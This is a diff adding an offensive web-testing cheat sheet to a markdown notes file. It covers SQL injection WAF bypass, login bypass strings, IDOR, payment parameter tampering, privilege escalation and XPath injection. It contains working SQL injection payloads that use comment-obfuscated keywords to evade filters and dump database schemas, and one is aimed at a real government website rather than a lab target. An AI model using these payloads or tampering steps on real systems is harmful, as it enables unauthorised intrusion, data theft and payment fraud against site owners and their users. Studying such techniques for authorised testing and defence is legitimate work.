@@ -1058,6 +1058,199 @@ sqlmap -u "http://target.com/?id=1" -D target_db --tables
 Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)
 
 ---
+# WAF Bypass Techniques
+
+## SQL Injection WAF Bypass
+
+In error-based SQL injection, we might be unable to fetch data from the database using the `UNION` function. For example:
+
+```sql
+' UNION ALL SELECT 1,2,3,4,5,6,7 --+
+```
+
+If we get a "Not Acceptable" error, it may be due to certain keywords (`UNION`, `ALL`, `SELECT`) being blocked by the WAF. We can bypass this restriction using comments:
+
+```sql
+' /*!12345UNION*/ ALL SELECT 1,2,3,4,5,6,7-- +
+```
+
+Example:
+
+```sql
+http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+
+' /*!12345union*/ all select 1,2,(SELECT+/*!12345GROUP_CONCAT*/(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 --+
+```
+
+### Using HackBar
+Using keywords such as `/*!12345UNION*/` converts the query into filtered keywords, allowing easy bypass of WAF restrictions.
+
+---
+
+## SQL Injection Authentication Bypass
+
+### Example Query
+Assume the login query:
+
+```sql
+SELECT username ='value1' AND password='value2' WHERE some_other_condition
+```
+
+Bypassing authentication:
+
+```sql
+value1 = ' OR 1=1 --
+value1 = '1 OR '1'='1 --
+```
+
+```sql
+SELECT username ='' OR 1=1 -- '  --fix
+SELECT username ='1 OR '1'='1 --'  --fix
+```
+
+**Reference:** [PentestLab Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
+
+### Identifying Vulnerable Fields
+1. Try symbols like `\,',",~, etc.` to generate errors and identify query structure.
+2. Test both username and password fields.
+3. View source code to identify quote symbols.
+4. Use brute-force attacks with default credentials.
+5. If registration is open, create an account and escalate privileges.
+
+---
+
+## Improper Authorization
+
+Exploiting improper access control by manipulating parameters such as `user_id`.
+
+Example:
+- Update profile information after logging out and send the same request again.
+- If the information updates, it indicates a vulnerability.
+
+---
+
+## No Rate Limiting
+
+**Example:** Forgot password functionality without rate limiting:
+
+1. Capture request in Burp Suite.
+2. Send it to Intruder/Sequencer.
+3. Send 10,000 requests.
+4. If 10,000 OTPs/SMS are received, the application is vulnerable.
+
+---
+
+## Password Reset Poisoning
+
+Example:
+1. Request a password reset link.
+2. Change the password manually after login.
+3. Check if the previous reset link still works.
+
+If the reset link remains valid, the system is vulnerable.
+
+---
+
+## HSTS Vulnerability
+Check using:
+- [SSL Labs](https://www.ssllabs.com)
+- Burp Suite response analysis
+
+---
+
+## Account Lockout Issues
+- No account lockout policy allows brute-force attacks.
+
+## Long Password DoS
+Check if the system allows excessively long passwords (>500 characters).
+
+Test with:
+- [Password DoS](https://password-dos.herokuapp.com/)
+
+---
+
+## IDOR (Insecure Direct Object Reference)
+
+### Examples:
+1. **Forgot Password Flow:**
+   - Intercept request containing `email` and `user_id`.
+   - Modify parameters and check for unauthorized access.
+
+2. **Facebook Page Deletion Attack:**
+   - If a page delete request contains `page_id`, replace it with another user's ID to delete their page.
+
+3. **Comment Modification:**
+   - Modify `uid` in request to change another user's comment.
+
+4. **Account Takeover:**
+   - Modify `profile_id` in a profile update request to edit another user's account.
+
+**References:**
+- [HackerOne Report 227522](https://hackerone.com/reports/227522)
+- [HackerOne Report 322661](https://hackerone.com/reports/322661)
+
+---
+
+## Parameter Tampering in Payment Gateways
+
+### Example: PayPal
+
+Encoded payment parameters:
+```
+&option_amount1=10.00&option_amount_selection1=pay10&
+```
+
+**Steps to Exploit:**
+1. Decode base64 values.
+2. Modify values (e.g., `10.00` → `1.00`).
+3. Re-encode and send the request.
+4. If payment is processed at the modified amount, the system is vulnerable.
+
+---
+
+## Privilege Escalation
+
+### Example: Reusing Invitation Links
+- If an invitation link does not expire, anyone can use it to join a group.
+
+### Accessing Admin Resources
+- Normal users accessing admin panels by modifying request parameters.
+- Example: `admin/trustcer`, `admin/reports`, `admin/dashboard`.
+
+---
+
+## XML Exploitation
+
+Extensible Markup Language (XML) files may contain sensitive data such as usernames and passwords.
+
+Example:
+```xml
+http://10.10.10.10/cat/accountsid=1
+```
+
+1. Try SQL injection.
+2. Use blind SQL techniques.
+3. Break query execution.
+
+**Tools:**
+- [Xpath Injection Toolkit](https://github.com/r0oth3x49/Xpath)
+- [xcat - XML Injection Tool](https://github.com/orf/xcat) *(Requires Python 3.7)*
+
+---
+
+### Missing Videos
+- Authentication and Authorization Attacks
+- Session Management Issues
+- Data Deserialization Vulnerabilities
+
+---
+
+## Iframe Injection Example
+```html
+<iframe src="http://bing.com" height="100%" width="100%"></iframe>
+```
+
+---
+
 
 
 
